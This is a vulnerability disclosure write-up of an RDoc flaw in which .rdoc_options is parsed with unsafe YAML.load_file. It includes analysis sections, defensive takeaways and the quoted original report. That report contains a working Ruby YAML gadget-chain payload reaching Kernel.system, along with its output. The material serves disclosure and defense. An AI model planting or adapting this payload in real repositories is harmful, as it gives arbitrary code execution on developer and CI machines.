# Remote Code Execution via Unsafe YAML Deserialization in RDoc .rdoc_options

## Metadata
- **Source:** HackerOne
- **Report:** 1187477 | https://hackerone.com/reports/1187477
- **Submitted:** 2021-05-07
- **Reporter:** ooooooo_q
- **Program:** Ruby RDoc
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Unsafe Deserialization, YAML Injection, Object Instantiation, Remote Code Execution
- **CVEs:** CVE-2024-27281
- **Category:** memory-binary

## Summary
RDoc's configuration file parser uses YAML.load_file() without restrictions on deserializable classes, allowing arbitrary object instantiation and remote code execution. An attacker can craft a malicious .rdoc_options file that executes system commands through Ruby's Gem and Net classes when rdoc command is invoked on a repository.

## Attack scenario
1. Attacker creates a malicious Git repository or sends code for review
2. Repository contains crafted .rdoc_options file with YAML gadget chain
3. Developer or CI/CD pipeline runs 'rdoc' command on the repository
4. RDoc loads .rdoc_options using unsafe YAML.load_file()
5. YAML parser instantiates Ruby objects (Gem::Installer, Net::BufferedIO, etc.)
6. Gadget chain execution triggers Kernel.system() with arbitrary command

## Root cause
The code uses YAML.load_file() without calling YAML.safe_load() or equivalent, which deserializes arbitrary Ruby objects. No allowlist of permitted classes exists, enabling exploitation through well-known Ruby gadget chains involving Gem and Net classes.

## Attacker mindset
An attacker targets developers who work with untrusted repositories (open source contributions, code review, supply chain attacks). They exploit the convenient but unsafe YAML.load() which was known to be vulnerable in Ruby for years. The attack is stealthy since .rdoc_options appears legitimate and triggers during normal documentation generation workflows.

## Defensive takeaways
- Always use YAML.safe_load() instead of YAML.load() for untrusted input
- If custom classes must be deserialized, explicitly allowlist permitted classes via safe_load's 'permitted_classes' parameter
- Avoid deserializing configuration files received from external sources without validation
- Implement input validation and schema enforcement for configuration files
- Consider using safer serialization formats (JSON, TOML) instead of YAML for untrusted config
- Audit all usage of YAML.load() in Ruby applications for similar vulnerabilities
- Warn users when processing untrusted repositories or provide sandboxed execution

## Variant hunting
Look for similar patterns in other Ruby tools that parse configuration files: Bundler gemfiles, Rakefile, config.yml files in other gems. Check for YAML.load() usage without safe_load in Rails, Sinatra, and other frameworks. Similar issues may exist in build tools (RSpec, Cucumber) that accept user-supplied configs.

## MITRE ATT&CK
- T1190
- T1195
- T1059
- T1203
- T1566

## Notes
The vulnerability requires direct execution of 'rdoc' command on attacker-controlled code, limiting blast radius compared to gem installation (which doesn't read .rdoc_options). This is still dangerous in CI/CD pipelines and code review workflows. The PoC uses known Gem class gadget chains documented in public research. Fix should migrate to YAML.safe_load() with appropriate permitted_classes configuration or remove YAML entirely.

## Full report
<details><summary>Expand</summary>

When parsing `.rdoc_options` used for configuration in RDoc as a YAML file, RCE is possible from Object injection because there are no restrictions on the classes that can be restored.

https://github.com/ruby/rdoc/blob/v6.3.0/lib/rdoc/rdoc.rb#L165

```ruby
  def load_options
    options_file = File.expand_path '.rdoc_options'
    return RDoc::Options.new unless File.exist? options_file

    RDoc.load_yaml

    begin
      options = YAML.load_file '.rdoc_options'
    rescue Psych::SyntaxError
    end
```

### PoC

```
$ rdoc -v
6.3.1
```

Create `.rdoc_options` file. The yaml attack code is based on this article [Universal RCE with Ruby YAML.load](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/), https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: date
         method_id: :resolve
```

```
$ rdoc
sh: reading: command not found
2021年 5月 7日 金曜日 13時34分42秒 JST
uh-oh! RDoc had a problem:
no implicit conversion of nil into String
```

Kernel.system is called and `date` is executed.

## Impact

RCE is possible when the `rdoc` command is executed for a repository received from the external.

I also tried building the gem with the `.rdoc_options` file.
When running with `gem rdoc`, the file `.rdoc_options` doesn't seem to be read and seems safe.
Therefore, it seems that the environment where RCE is actually possible is limited.

</details>

---
*Analysed by Claude on 2026-05-12*
